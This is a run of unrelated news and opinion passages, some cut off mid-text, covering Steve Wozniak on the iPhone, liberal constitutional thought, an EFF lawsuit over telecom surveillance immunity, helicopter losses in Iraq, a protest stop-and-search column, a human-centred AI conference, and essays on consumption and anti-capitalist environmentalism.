So instead of getting $ 100 back you are getting $ 50 back sort of .
It is very optimal to the company .
I feel badly about the situation for everyone .
I do n't think Apple should have even done it .
Maybe a very much more gradual price reduction , $ 50 at first or find ways to bundle it into a savings on your account . "
Wozniak says he probably purchased about 20 iPhones for himself and his friends and has not gotten a single refund back on his own although some of his friends have gotten their refunds .
" I have n't had the time to , " he said .
" I will .
I only have one iPhone that I am using .
I figured at first I would use three for myself .
But one is enough . "
NEXT : Woz : Still A Big Apple Fan Of The iPhone
Even though he takes issue with the price cut and how it was handled , Wozniak said he is a big fan of the iPhone .
" I fell in love with the iPhone , " he said .
" I did not like it at first . "
Wozniak said it took him a month to fall in love with the device .
He said he also " loves the Blackberry Pearl because it is such a small size .
The iPhone is bigger , but boy that iPhone is more fun even when it 's slower at dialing phone calls . "
Wozniak said he still has not switched the phone he primarily uses for voice over to the iPhone because of the " voice quality , being able to hear it . "
What 's more , he said , the iPhone does n't work with the BlueTooth ( wireless hands free ) technology he loves so much .
" I like to be hands free and my voice dialing is not built into the iPhone yet , " he says .
" I expect that soon . "
Wozniak , however , had high praise for the iPhone 's interface and the ability to use the phone like almost like a full fledged desktop to view the internet .
" I like the human approach , " he said of the iPhone .
" If a Web page looks the same as on my computer , I do n't have to learn a whole new familiarity .
Every smart phone I used before the iPhone , if I used it for Web browsing I just got sick .
I almost wanted to throw up .
It was so miserable an experience .
Sometimes I could n't even find the field I wanted .
It was horrible to navigate and I said , ' I am not going to use this !'
Every one of them I put down .
I said I am not going to switch to a Smart Phone so ridiculously inhuman .
I think the iPhone has really got a lot of the right formulas :
Make the Web page look the same .
Why did n't anyone ever do that before ? "
Wozniak said he is surprised it took so long for a company to develop a successful Smart Phone - like device to surf the internet .
" Sony should have done it , " he said .
" They had the Clie long ago with the big screen and they just did n't find the right formula .
In a lot of these cases , Apple has replaced Sony in making the best products that everyone wants . "
Wozniak complained that a lot of the intense focus on user interface design even at Apple has gone away .
" We have learned the formulas and a lot of that ( innovative ) thinking has gone away , " he said .
" Now we ( at Apple ) are a monopoloy as much as Microsoft .
If you 're going to buy a Macintosh you 're going to buy a Macintosh and we do n't need quality to sell . "
Wozniak said some the work is shoddy and the lack of focus is evident in " confusing " design or inappropriate wording .
At Apple in the early days , there was even a booklet for user interface guidelines that came from the early Macintosh .
" We still prided ourselves on being easy to use and user interface , " he said .
" User interface means the software developer put a whole lot of extra software in to make it work the human way , the way the human will understand . "
Wozniak said he is an avid consumer gadget user who usually has two phones on him and sometimes three or four .
" I keep up by buying them , " he said .
" I go through almost every significant cell phone or smart phone that comes out to try to get my own opinion .
I can't judge it just based on what I read .
Sometimes you have to really use it to see what works and what does n't .
What is cumbersome for people and what is not . "
NEXT : Who Is More Innovative : Apple Or Google ?
Wozniak said he believes that Apple still has an edge over Google as the most innovative company .
" I would say Apple is still number one just based on the fact they are taking themselves into such new businesses so well , " he said .
" A lot of people from Apple , even a lot of people that worked on the Apple Lisa and Macintosh computers in the beginning now work at Google .
The thinking over at Google is very much like early Apple days .
The fact that they give people time off to work on their own ideas is exactly matches some of the things that made Apple great .
I wish Apple did that . "
Wozniak said he has switched over to Google calendaring .
" Google has n't gotten me to change over to everything , " he said .
" But boy if I was ( advising ) somebody new and telling them what they should do for email , GMail would be my first suggestion .
So far Google has been very good to its users .
You almost wonder how can they be that good like they are giving and still make money . "
As for Google 's GMail , Wozniak said he has GMail accounts that he checks but does n't use extensively .
Sometimes with new email services , Wozniak tries to make sure he has favorite versions of his name such as Steve .
Wozniak or SteveWoz on the new service .
" Other people try to jump in , " he said .
" Sometimes a service will start up and somebody else will have SteveWoz and they 'll have Woz and I 'm pissed .
It happened on AOL . "
Wozniak said when Apple came out with the .
Mac domain moniker the name Woz was not available .
After being initially upset at not being able to get his own name for the Apple domain , he learned that his old friend Jobs " had actually saved it for me . "
“ It ’s unclear to me that the left understands what it is to re-imagine a constitutional agenda and sell it to the American people , ” said Barry Friedman , a professor at New York University Law School who is completing a history of the relationship between popular opinion and judicial review .
“ That ’s what the right did .
They lived for a long time in the diaspora .
They found issues and ways to market them , with a single - mindedness of purpose and vision that has served them well . ”

Liberals have not been completely passive , of course .
In the law schools , they have worked to build their own version of the conservative Federalist Society , the 25 - year - old idea - incubating and networking group that confers a valuable credential on young lawyers and that numbers its members among those at the highest levels of law and politics .
The American Constitution Society , founded six years ago with a single student chapter at the Georgetown University Law Center , now has student chapters at 157 law schools and chapters for lawyers in 25 cities .
“ Our project is to make sure that the legal culture does n’t simply buy today ’s rhetoric , ” said the group ’s founder , Peter J. Rubin , a Georgetown law professor and former clerk to Justice David H. Souter .
He attributes the organization ’s rapid growth to “ an incredible thirst for an alternative vision . ”
Exactly what that vision should encompass is now the question .
It is easy enough to find consensus on a checklist that would include a robust reading of the guarantees of the Bill of Rights , including the notion that some rights are fundamental ; a constitutional interpretation not tethered to a search for the framers ’ original intent ; invigorating the right to privacy to include personal privacy in the electronic age ; restoring the shield of habeas corpus ; and recapturing the government ’s ability to intervene for the benefit of African - Americans and other minority groups without being constrained by the formal and ahistorical neutrality that liberals saw as the conceptual flaw in the chief justice ’s opinion a little over a week ago invalidating two voluntary school integration plans .
The challenge for those inspired by such an agenda goes beyond the question of where the votes would come from on the current court .
The notion that profound social change can be accomplished through judicial action has taken a huge beating , and even liberals , watching the political currents of recent decades , have come to doubt the ability of courts to change the world .
The tension is acute between the vision of the Constitution as an engine of social progress , on the one hand , and the fear that harnessing it through judicial action to serve that role is , on the other hand , simply counterproductive .
The tension is apparent even in those liberals who sing the praises of judicial “ minimalism , ” as Cass R. Sunstein of the University of Chicago Law School does .
In a provocative posting this spring on The New Republic ’s Web site , he deplored “ the absence of anything like a heroic vision on the court ’s left , ” a surprising complaint given his well - known advocacy of judges deciding cases as narrowly as possible .
In an interview , he elaborated .
He said he was worried about the imbalance between the defensiveness and caution on the court ’s liberal side and the “ bold , clear strokes ” issuing from Justices Antonin Scalia and Clarence Thomas .
“ There ’s not a voice on the court for significant social reform that the others have to respond to , ” he said .
“ It skews the court ’s internal processes and public discussion of the court . ”

The Electronic Frontier Foundation ( EFF ) has filed a lawsuit against the US Department of Justice ( DOJ ) in an effort to obtain records that could shed light on telecommunication industry lobbying activities .
The EFF suspects that major telecommunications companies like AT&T have attempted to use political leverage to compel lawmakers to support legislation that would grant the companies legal immunity for their involvement in the federal government 's extralegal electronic surveillance program .
The EFF requested records under the Freedom of Information Act ( FOIA ) last month from the Department of Justice and Office of Legislative Affairs .
The records sought by the EFF include documentation of interaction pertaining to FISA amendments and surveillance immunity between Department of Justice officials , representatives of the telecommunications companies , and members of the Senate or House of representatives .
The government has failed to process the FOIA request within the 20 - day maximum waiting period stipulated by law , so the EFF has followed up its request with a lawsuit ( PDF ) demanding swift compliance .
Recent reports have revealed evidence that the telecommunications companies have been heavily lobbying for immunity in order to avoid potentially costly and embarrassing litigation .
FCC Chairman Kevin Martin has declined requests from several Congressmen and privacy groups to investigate whether or not major telecommunications companies have violated laws prohibiting disclosure of customer information by supplying data to the NSA and FBI .
During recent congressional hearings , Bush administration intelligence officials have characterized the liability faced by the telecommunications companies as unfair and have asked Congress to ensure that the companies are n't punished for assisting the government with surveillance activity deemed necessary by the administration .
Critics argue that granting the telecommunications companies retroactive immunity for colluding with the government in illegal activity would severely undermine the rule of law .
Doing so would also indirectly weaken the system of checks and balances that is needed to preserve the integrity of the federal government .
If the alleged criminal activity perpetrated by the telecommunications companies was needed in order to preserve national security , contend critics of the White House , then intelligence officials should have requested that Congress alter the laws to permit such activity before implementing the surveillance program rather than asking for the behavior to be excused after the fact .
The executive branch should not be permitted to obviate proper oversight by selectively elevating its coconspirators above the rule of law .
If the telecommunications companies are held accountable for their participation in the surveillance plot , it may deter similar activity , hopefully ensuring that intelligence agencies and the executive branch will go through the proper legislative channels in the future when establishing broad surveillance programs .
The crashes raise concerns that insurgents , who have proved highly innovative in warfare , have acquired new weaponry .
Twenty Americans , including 16 soldiers and four civilians working for a security company , died in the crashes .
In the deadliest incident 12 soldiers died on January 20 when their Black Hawk came down near Baquba , northeast of Baghdad .
In each case , reports from witnesses suggested that the craft were shot down .
Yesterday this was confirmed by Major General William Caldwell , the senior US military spokesman .
" We have had four helicopters shot down ... it appears they were all the result of some kind of ground fire , " he said .
" Obviously , based on what we have seen , we are already making adjustments to our tactics and techniques , as to how we employ our helicopters . "
Maj Caldwell said the threat went wider than the US military aircraft .
Civilian security firms have also become increasingly dependent on the use of helicopters to move and protect employees .
Five Americans from the Blackwater USA security firm died when their aircraft was brought down over Baghdad on January 23 .
The confirmation that Iraqi insurgents have found a way of increasing their hit rate against helicopters poses US military strategists with a new headache just when they are under pressure to notch up successes under President Bush 's so - called surge policy - increasing troop numbers by 21,000 in an attempt to regain the initiative in Baghdad and other key areas of the country .
Toby Dodge , an Iraq expert at Queen Mary 's college , University of London , said that as the surge of US personnel gathered pace an increase in casualties from aircraft crashes was almost inevitable .
US forces had already been pushed off the roads and into the air by roadside bombs , and as troops are moved around the battle zones in growing numbers they are becoming ever more vulnerable .
" This is the first sign that more American soldiers are being put in the line of fire , and the cost of that , unfortunately , is that these incidents are bound to increase , " Mr Dodge said .
Evidence of the vulnerability of troops comes ahead of important Iraq debates on Capitol Hill this week .
A resolution put forward by the Republican senator from Virginia , John Warner , would put the Senate on record as opposing the sending of combat reinforcements under the surge .
The US has had difficulty with attacks on its helicopters ever since Apache attack aircraft were deployed over Baghdad during the invasion in 2003 , when they were found to be surprisingly vulnerable to ground fire .
At the end of 2003 they began flying low and fast in order to avoid missiles launched from the ground , but this leaves them exposed to simple gunfire .
Insurgents use rocket - propelled grenades and anti-aircraft missiles in Iraq , making high flying impossible .
More than 50 helicopters have crashed since the invasion , about half under insurgent attack .
Until the past two weeks it was felt that the flying tactics and use of varying routes had reduced the risk .
The most recent incident , last Friday , in which an Apache crashed north of Baghdad killing both its crew members , may be particularly troublesome to US strategists .
Local reports suggested that two American aircraft came under fire and one was brought down after the pilot turned back to confront his assailants .
The helicopters had been travelling along a well - used route to the US base in Taji , suggesting that even channels that had previously been considered secure may now be vulnerable .
With the intensification of the American effort focused on Baghdad , tension remained high in the capital yesterday in the aftermath of the single most deadly bomb attack in the country since the start of the war .
A suicide truck bomb on a Shia market on Saturday killed 132 people and wounded 302 .
Sunni bombers are thought to be escalating their attacks in Shia areas ahead of an anticipated offensive by US and Iraqi forces on their strongholds in the capital .
At least 22 other Iraqis died in a round of bombings and shootings in Baghdad yesterday .

Skin Deep Models Become Walking Canvases at Bodypainting Festival
Naked models were turned into an artistic medium at the fourth German Bodypainting Festival this weekend .
Among the creations were futuristic androids and even a " Bavarian extraterrestrial . "
The demonstration against the arms fair in London 's Docklands on Tuesday saw the usual gathering of pensioners , Quakers , anarchists , peaceniks and tutting liberals ( my category ) , waving banners in blood - red paint .
From a distance it looked like Sesame Street was doing a show - and - tell special on imperialism .
Closer inspection would reveal a cop - to - demonstrator ratio of 1:1 ; this was n't crowd control , it was more like mentoring .
I had been asked along by Campaign Against Arms Trade as a speaker , which entailed being backed up against a brick wall and addressing a crowd penned in by metal barriers , via a megaphone held above the phalanx of the Met 's fluorescent jackets .
Everything went swimmingly : local residents ' speeches were met with particular appreciation , news teams scribbled notes , and peace songs were faintly sung .
I thanked the organisers and headed for the Docklands light railway to go home .
As I walked up the entrance ramp I was stopped by police .
" I am afraid I can't let you past me until I have searched you , as I have reason to believe that you could have articles intended for criminal damage , " said an officer .
" What good reason ? " I asked .
" We watched you address the crowd . "
" I am being stopped for what I said in a speech ? " I spluttered .
" Oh no .
Not because of what you said .
It is because you look overconfident . "
That was the official reason , I was " overconfident " ; bless them , they even wrote it on the stop - and - search slip the police have to provide .
Under the title " Grounds for Search " , the officer wrote : " overconfident attitude of Mr Thomas " .
How can I walk past the police in an overconfident manner that might indicate criminality on my part , I thought , short of wearing a black - and - white stripy jumper , with a bag marked " SWAG " , shouting : " Do your worst , flatfoot ! "
How do the police differentiate between " confidence " and " overconfidence " ?
Maybe there is a training programme at Hendon , perhaps an ID line - up room for the overconfident full of the Tory frontbench , where new recruits point at Michael Gove shouting : " That one !
Definitely that one ! "
Perhaps there are briefing sessions where the significance of " overconfidence " is explained by Sir Ian Blair with the aid of a Venn diagram : " Circle one is Osama bin Laden , circle two Ronnie Biggs , and finally drug dealer Howard Marks is circle three .
What is in the shaded area where the circles coincide ?
Cockiness .
They all cock a snook at authority .
That and a cavalier attitude towards health and safety . "
Surely , if overconfidence is now part of the police 's forensic arsenal , Jeremy Clarkson could never leave his house .
He would be over the car bonnet with the cops rifling through his manbag before you could say " He 's just Richard Littlejohn with a copy of Motor Sport magazine " .
And if the cops were really after the overconfident , they would have a wagon permanently stationed outside Peter Jones in Sloane Square .
There is a definite sense among campaigners that the police conduct stop and search for no other reason than that they can .
I recently saw police search a clown in central London .
She was wearing a colander on her head and dressed in rainbow tights .
I am not an expert but I believe Raffles preferred black slacks .
And I would guess that most criminals avoid wearing a colander ; it not only draws attention to them , but it tends to put the balaclava out of shape .
I could be wrong , it could be a double bluff ; maybe clowns have pulled off a multitude of heists .
The late Charlie Caroli might have done the Brinks Mat job , shoving the bullion down his baggy pants before wandering off to shove shaving foam into someone 's face .
Bizarrely , I have worked quite a bit with the authorities on arms issues , finding and reporting three companies offering illegal torture equipment at the last Docklands arms fair , then appearing before a parliamentary select committee on arms dealing .
Last May
I cooperated with police after I found electroshock torture equipment being demonstrated at the police and security trade fair in Birmingham .
In fact customs were even tipped off on these pages only weeks ago about possible breaches at this Docklands fair : a warning that proved accurate as two arms companies were thrown out of the fair for allegedly offering leg irons - an offence under the Export Control Act , as reported in the Guardian yesterday .
Perhaps those arms dealers slipped past the police by being underconfident , possibly dressed as Dickensian clerks , wringing their hands and muttering " Good day t'yer , guv' nor " when they touch their caps .

In order to celebrate World Usability Day we have used this years theme – Human - Centred AI .
Over the last two decades computers have enhanced human ’s abilities to perform our work , ensure our safety , and even lighten our workload .
Interest continues to increase in AI ’s capabilities to improve human performance .
However , there is an accompanying fear that humans will lose control of the technology they create .
During the day we will explore the past and the present of AI .
How is it being used ?
How could , and maybe should , we use it ?
Where do we see the strongest potential within UX and design .
For example , how is the music industry using AI ?
Within the field of art , are there new ways to be creative ?
We will also talk about bias within AI , not just the technology but also in the perspective of where it comes from and whom is working with it .
Join us at STHLM Xperience Conference and together we will discuss Human - Centered AI while learning from each other how to use it in the right way .
It is a participatory conference with lectures , practical tips , and workshops .
Speakers on stage are experts in their field .
The planet has limited resources .
A lot of people need and want those resources .
So , what ’s my fair share ?
How big a slice of the pie can I take without it meaning that someone else has to suffer ?
I want happiness for myself and my family , but the big question underlying the No Impact Man project is whether you can achieve that without causing too much suffering for others .
My last post was about the millions of still - working cell phones that will poison the planet as people toss them in landfills and incinerators in favor of their new iPhones ( you can also read a long article about e-waste here ) .
Do n’t get me wrong .
I want an iPhone ( and I could get one , according to No Impact rules , if I could find one second hand ) .
But the question , when buying iPhones or anything else , is how do my actions as a consumer affect the rest of the world ?
When am I taking more than my fair share ?
When am I causing suffering ?
In other words , just because I want to get an iPhone , should I ?
For me , during the No Impact project , with its various rules , there is no real conundrum .
I just do as the rules tell me .
I probably could n’t get a used iPhone anyway , and I ca n’t buy new .
Later , though , when the project is over , I ’ll be back to the war between my desires and my conscience .
That ’s why I ’m thinking so much about the iPhone — because I both want one and feel I should n’t get one .
Buying gadgets — iPhones , TVs , computers — has a huge impact on the planet and on other people .
To wit — and let me warn you that this is the part in the horror movie where you need to close your eyes — four million people have died in a war that is , at least in part , a struggle to control the world ’s supplies of an essential ingredient in most of our electronics , a metal called coltan , 80 percent of which lie beneath the Democratic Republic of Congo .
In his article entitled “ A journey into the most savage war in the world , ” published in the Independent on June 5 , 2006 , Johann Hari wrote that the war in the Congo is :
“ … the story of a trail of blood that leads directly to you : to your remote control , to your mobile phone , to your laptop and to your diamond necklace …
“ This war has been waved aside as an internal African implosion .
In reality it is a battle for coltan and diamonds and cassiterite and gold , destined for sale in London and New York and Paris .
It is a battle for the metals that make our technological society vibrate and ring and bling , and it has already claimed four million lives in five years and broken a population the size of Britain’s .
No , this is not only a story about them .
This – the tale of a short journey into the long Congolese war we in the West have fostered , fuelled and funded – is a story about you . ”
Am I saying I will never buy another electronic device ?
No .
But I am saying I want to be conscience of the effects of my consumption , and that it should probably not be particularly conspicuous .
Given that the planet does have limited resources and my use of them does have the potential to contribute to unhappiness , I ’m back where I started : what is my fair share ?

See The Idols of Environmentalism for part one .
I
ENVIRONMENTALISTS
SEE THE ASPHALTING of the country as a sin against the world of nature , but we should also see in it a kind of damage that has been done to humans , for what precedes environmental degradation is the debasement of the human world .
I would go so far as to say that there is no solution for environmental destruction that is n’t first a healing of the damage that has been done to the human community .
As I argued in the first part of this essay , the damage to the human world has been done through work , through our jobs , and through the world of money .
We are not the creators of our own world ; we merely perform functions in a system into which we were born .
The most destructive aspect of our jobs is that in them we are mere “ functionaries , ” to borrow Josef Pieper ’s term .
Just as important , we have a function outside of work : consumption .
Money in hand , we go into the market to buy the goods we no longer know how to make ( we do n’t even know how to grow and preserve our own food ) and services we no longer know how to perform ( frame a house ?
might as well ask us to design a spaceship ) .
Challenging our place in this system as mere isolated functions ( whether as workers or consumers ) is a daunting task , especially for environmentalists , who tend to think that human problems are the concern of somebody else ( labor unions , the ACLU , Amnesty International , Habitat for Humanity , etc. ) .
We ’re about the “ Earth first . ”
My argument is simply that the threats to humans and the threats to the environment are not even two parts of the same problem .
They are the same problem .
For environmentalism , confronting corporations and creating indignant scientific reports about pollution is the easy stuff .
But these activities are inadequate to the real problems , as any honest observer of the last thirty years of environmental activism would have to concede .
The “ last great places ” can not be preserved .
We can no more preserve them than we can keep the glaciers from melting away .
Responding to environmental destruction requires not only the overcoming of corporate evildoers but “ self - overcoming , ” a transformation in the way we live .
A more adequate response to our true problems requires that we cease to be a society that believes that wealth is the accumulation of money ( no matter how much of it we ’re planning on “ giving back ” to nature ) , and begin to be a society that understands that “ there is no wealth but life , ” as John Ruskin put it .
That is the full dimension and the full difficulty of our problem .
Unfortunately , on these shores the suggestion that there is something fundamentally destructive in work , money , and capitalism leads quickly to emotional denials .
This is so even among self - described environmentalists , card - carrying members of the Sierra Club and The Nature Conservancy .
So we try to persuade ourselves that capitalism can become green .
I do n’t believe that capitalism can become green , simply because the imperatives of environmentalism are not part of its way of reasoning .
Capitalism can think profit but it ca n’t think nature .
It ’s not in its nature to think nature .
What is part of its nature is marketing ( “ We ’re organic !
Buy us ! ” ) , even while its actions — industrial livestock practices that masquerade as Earth - friendly , for instance — are really only about market share , dividends , and stock value .
Capitalism as a system of ever - accelerating production and consumption is , as we environmentalists continually insist , not sustainable .
That is , it is a system intent on its own death .
Yet the capitalist will stoically look destruction in the face before he will stop what he ’s doing , especially if he believes that it is somebody else whose destruction is in question .
Unlike most of the people living under him , the capitalist is a great risk - taker largely because he believes that his wealth insulates him from the consequences of risks gone bad .
Ever the optimistic gambler with other people ’s money , the capitalist is willing to wager that , while there may be costs to pay , he wo n’t have to pay them .
Animals , plants , impoverished people near and far may have to pay , but he bets that he wo n’t .
If called upon to defend his actions , he will of course argue that he has a constitutionally protected right to property and the pursuit of his own happiness .
This is his “ freedom . ”
At that point , we have the unfortunate habit of shutting up when we ought to reply , “ Yes , but yours is a freedom without conscience . ”
Being willing to say such things about capitalism does not mean that one has a special access to the Truth , but it also does n’t mean that one is a mere ideologue , or that most dismissible of things , a communist .
It merely requires honesty about what looks us right in the face .
It requires intellectual conscience .
For instance , as a matter of conscience we should be willing to say that the so - called greening of corporate America is not as much about the desire to protect nature as it is about the desire to protect capitalism itself .
Environmentalists are , on the whole , educated and successful people , many of whom have prospered within corporate capitalism .
They ’re not against it .
They simply seek to establish a balance between the needs of the economy ( as they blandly put it ) and the needs of the natural world .
For both capitalism and environmentalism , there is a hard division between land set aside for nature and land devoted to production .
Environmentalists consider the preservation of a forest a victory , but part of the point of that victory is ( usually ) that humans can’t live in this forest .
Private interests have been bought out .
The forest is now “ set aside . ”
We could draw a national map that showed those spaces that we imagine conform to a fantasy of natural innocence ( wilderness , forests , preserves , parks ) and those spaces given over to the principles of extraction , exploitation , and profit .
The boundary lines within this map are regularly drawn and redrawn by the government in some of our most bitter political fights .
( “ Mineral extraction !
Why , that ’s a national wildlife area ! ”
“ Snail darter !
Why , that ’s economic development ! ” )
But regardless of which political party is drawing this map , we humans are left right where we have always been , at the mercy of the boss , behaving like functionaries , and participating in the very economic activities that will continue to eat up the natural world .
For all its sense of moral urgency , environmentalism too has abandoned humans to the inequalities , the exploitation , and the boredom of the market , while it tries to maintain the world of nature as a place of innocence where a candy wrapper on the ground is a blasphemy .
It ’s a place to go for a weekend hike before returning to the unrelenting ugliness , hostility , sterility , and spiritual bankruptcy that is the suburb , the strip mall , the office building , and the freeway ( our “ national automobile slum , ” as James Howard Kunstler puts it ) .
Ideally , the map of natural preservation and the map of economic activity would be one map .

HERE’S A BALD ASSERTION FOR WHICH I have no proof scientific or otherwise : a human society would never willingly harm nature .
This is a way of saying that violence is not a part of human nature .
This of course contradicts the opinion commonly held by Christianity and science alike that humans are by nature violent .
This fatalism has the effect of making us accept wars , the victimization of the vulnerable , and the rapacious destruction of the natural world as tragic but inevitable .
But what this fatalism about our “ nature ” ignores is the fact that the violence with which environmentalists are most concerned is not the aberrant violence of the individual human but the violence of organizations .
In particular , the violence that we know as environmental destruction is possible only because of a complex economic , administrative , and social machinery through which people are separated from responsibility for their misdeeds .
We say , “ I was only doing my job ” at the paper mill , the industrial incinerator , the logging camp , the coal - fired power plant , on the farm , on the stock exchange , or simply in front of the PC in the corporate carrel .
The division of labor not only has the consequence of making labor maximally productive , it also hides from workers the real consequences of their work .
People outside of such social and economic organizations might hunt in nature , fish , gather , harvest , use nature to their own ends in countless ways , but they would never knowingly destroy it , not because they are by nature good and benevolent , but because destruction is not necessary , it ’s a lot of hard work , and it ’s self - evidently self - defeating .
For example , the near extinction of the buffalo was not driven by the thought “ Well , if I shoot one I might as well shoot them all , ” or game sport gone mad , or sheer maliciousness toward the animal .
Ultimately , it was driven by the market for buffalo hides in that far - off place that was never once home to a buffalo , New York City .
The extermination of the buffalo was driven by the same logic that drives the clearcutting of forests and the construction of high - pollution coal - fired power plants today : entrepreneurial freedom , the desire for profit , and “ jobs for working people . ”
If all this is so , it is only possible to conclude from our behavior for the last two hundred years that ours is not a human society ; that it is a society outside of the human in some terrible sense .
And , in fact , it was one of the earliest insights of Karl Marx that the kind of work provided by capitalism was alienating .
That is , it made us something other than what we are .
It dehumanized us .
And so , in our no - longer - human state , it became perfectly natural for us to destroy nature ( which should sound to you just as perverse as the situation really is ) .
Alienation in work means that instead of knowing something about a lot of things concerned with human fundamentals like food , housing , clothing , and the wise and creative use of our free time , we know one small thing .
One task in an ocean of possible tasks .
Aldous Huxley provided a very different and a very human account of work in The Perennial Philosophy .
He called it “ right livelihood ” ( a concept he borrowed from Buddhism ) .
For Huxley , work should serve other people , provide learning experiences that deepen the worker , and do as little harm as possible .
( You will note that there is nothing in this description about a competitive compensation and benefits package . )
But what percentage of American jobs conforms to this description ?
Five percent ?
Even in the new “ creative ” information economy where the claim could be made that computer designers and software technicians are constantly learning , is it a learning that deepens ?
That serves others broadly ?
And what of the mindless , deadening work of data processors and telemarketers — our modern , miserable Bartlebys and Cratchits — locked in their cubicles from San Jose to Bangalore ?
Our culture ’s assumption that there is virtue in work flatters us into thinking that we ’re doing something noble ( “ supporting our families , ” “ putting food on the table , ” “ making sacrifices ” ) when we are really only allowing ourselves to be treated like automatons .
We all have our place , our “ job , ” and it is an ever less human place .
We are diligent , disciplined , and responsible , but because of these virtues we are also thoughtless .
TO END THE REIGN OF WORK as something for “ functionaries , ” and to end the destruction that results from that fractured form of work , we have two options .
First , we can simply wait for the catastrophic failure of global capitalism as a functioning economic system .
Books on peak oil , sinking water tables , and the impending doom of global warming are abundant and convincing .
Huge human populations , especially in the East and Africa , are at risk of mass starvation , civil war , and the disastrous loss of human habitat due to rising ocean levels and desertification .
Capitalism will have no choice but to retreat from responsibility for these crises even though they are part of the true costs of doing business .
Unfortunately , simply waiting for catastrophe does n’t ensure that anything good will follow from it , as Darfur has illustrated .
It ’s true that there will be opportunities to create locally based and sustainable communities , but it ’s also true that fascism , barbarism , and regression are possible .
So a second option is in order .
We can start providing for a different world of work now , before the catastrophe .
We need to insist on work that is not destructive , that deepens the worker , that encourages her creativity .
Such a transformation requires a willingness to take a collective risk , a kind of risk very different from capitalist risk taking .
The kind of risk I ’m suggesting is no small matter .
It means leaving a culture based on the idea of success as the accumulation of wealth - as - money .
In its place we need a culture that understands success as life .
For John Ruskin , humans should make “ good and beautiful things ” because those things will re-create us as good and beautiful in their turn .
To make cheap and ugly and destructive things will kill us , as indeed we are being killed through poverty , through war , through the cheapening of our public and private lives , and through the destruction of the natural world .
Of course , many will argue that leaving capitalism behind is not “ realistic . ”
“ Oh , certainly , ” we ’re assured , “ there are inequalities in capitalism , but on the whole it provides for everyone ’s prosperity , it provides the greatest good for the greatest number .
Why , you ’ll kill the goose that lays the golden egg !
Look , if there ’s a patch of forest somewhere you want to save , fine , I ’ll write a check .
But this sort of talk is dangerous and un-American . ”
What we need to recognize is that the real realism for capitalism is in the consequences of its activities .
As even Al Gore understands , we are living now in the early stages of an era of consequences : catastrophic climate change , species extinction , and human population collapse .
It is not naïve or unrealistic to say that we ought to change ; it is only tragic if we do n’t .
But let ’s be honest .
For the moment , not even the pleasantly affluent people who regularly support the major environmental organizations ( people like me ) want to hear about how bad capitalism is or to think seriously about abandoning it as an organizing principle .
Most of us want to believe that our quarrel is just with rogue corporations , a few “ bad apples ” as President Bush likes to say , and not with capitalism as such .
But thinking this is simply a form of lying .
We deny what we can plainly see because to acknowledge it would require the fundamental reshaping of our entire way of living , and that is ( not unreasonably ) frightening for most people .
Nevertheless , our loyalty to capitalism makes us fools .
Worse than that , we know we ’re being fooled , and yet we lack the ability not to be fooled .
Not for nothing did the philosopher Paul Ricoeur once observe that capitalism is “ a failure that can not be defeated . ”

I AM INEVITABLY ASKED AT THIS POINT in my argument just what exactly it is that I am proposing that people do .
What would I put in capitalism ’s place ?
In reply , I am always tempted to quote Voltaire ’s response to the complaint that he had nothing to put in the place of the Christianity he criticized .
“ What ! ” he said , “ A ferocious beast has sucked the blood of my family ; I tell you to get rid of that beast , and you ask me , what shall we put in its place ! ”
Unlike Voltaire , I would also suggest that what has the best chance of defeating the “ beast ” is spirit .
In accepting science as our primary weapon against environmental destruction , we have also had to accept science ’s contempt for religion and the spiritual .
This is the unfortunate legacy of science ’s two - century - old confrontation with what it has always called “ religious dogma and superstition . ”
But this attitude is myopic ; it is science at its most stupid .
Environmentalism should stop depending solely on its alliance with science for its sense of itself .
It should look to create a common language of care ( a reverence for and a commitment to the astonishing fact of Being ) through which it could begin to create alternative principles by which we might live .
As Leo Tolstoy wrote in his famous essay “ My Religion , ” faith is not about obedience to church dogma , and it is not about “ submission to established authority . ”
A people ’s religion is “ the principle by which they live . ”
The establishment of those principles by which we might live would begin with three questions .
First , what does it mean to be a human being ?
Second , what is my relation to other human beings ?
And third , what is my relation to Being as such , the ongoing miracle that there is something rather than nothing ?
If the answer to these questions is that the purpose of being human is “ the pursuit of happiness ” ( understood as success , which is understood as the accumulation of money ) ; and if our relation to others is a relation to mere things ( with nothing to offer but their labor ) ; and if our relation to the world is only to “ resources ” ( that we should exploit for profit ) ; then we should be very comfortable with the world we have .
If it goes to perdition at least we can say that we acted in good faith .
But if , on the other hand , we answer that there should be a greater sense of self - worth in being a human , more justice in our relation to others , and more reverence for Being , then we must either live in bad faith with capitalism or begin describing a future whose fundamental values and whose daily activities are radically different from what we currently endure .
The risk I propose is simply a return to our nobility .
We should refuse to be mere functions of a system that we cannot in good conscience defend .
And we should insist on a recognition of the mystery , the miracle , and the dignity of things , from frogs to forests , simply because they are .
Such a “ religion ” would entail a refusal to play through to the bloody end the social and economic roles into which we happen to have been born .
What lies beyond the environmental movement is not only the overcoming of capitalism but self - overcoming .
We take some justifiable pride in the idea that we are environmentalists , but even that identity must be transcended .
A “ beyond environmentalism ” movement would be a sort of Party of Life .
It would be a commitment to thriving , and a commitment to what is best in us .
Does this mean that , for the time being , we stop working under the banner of environmentalism to oppose corporations when they are destructive ?
Of course not .
But it is important to know that there is a problem more fundamental than a perverse “ power ” standing opposed to us ( in villainous black caps with “ Monsanto ” on the brim ) .
That deeper problem is our own integration into an order of work that makes us inhuman and thus tolerant of what is nothing less than demonic , the destruction of our own world .
THE PRINCIPLE BY WHICH THE WEST has lived for the last two centuries has been “ It ’s okay to use violence if you can gain something by it . ”
Violence against the poor , violence against the vulnerable , violence against those who possess something you want , and violence against the natural world .
That is capitalism as a religious principle .
What is beyond environmentalism , what is our Party of Life , is actually a return to our oldest spiritual convictions : a reverence for creation and a shared commitment to the idea that religion is finally about understanding how to live in faithful relation to what has been given to us in creation .
In the end , our problem is that the busy , destructive work of functionaries has taken the place of a thoughtful , spiritual understanding about how to live .
Our problem is not that we are ignoring what science has to tell us about environmental destruction .
Our problem is that we are spiritually impoverished .
Bankrupt , if you will .
Spiritual rebirth will mean the rediscovery of true human work .
Much of this work will not be new but recovered from our own rich traditions .
It will be useful knowledge that we will have to remember .
Fishing as a family and community tradition , not the business of factory trawlers .
Agriculture as a local and seasonal activity , not a carbon - based scheme of synthetic production and international shipping .
Home - and community - building as common skills and not merely the contracted specialization of construction companies and urban planners .
Even “ intellectual workers ” ( professors and scholars ) have something to relearn : their own honored place in the middle of the community and not in isolated , jargon - ridden professional enclaves .
Such knowledge was once the heart of our lives , and not that long ago .
Before 1945 , survival meant that most families would have all of these skills to some degree .
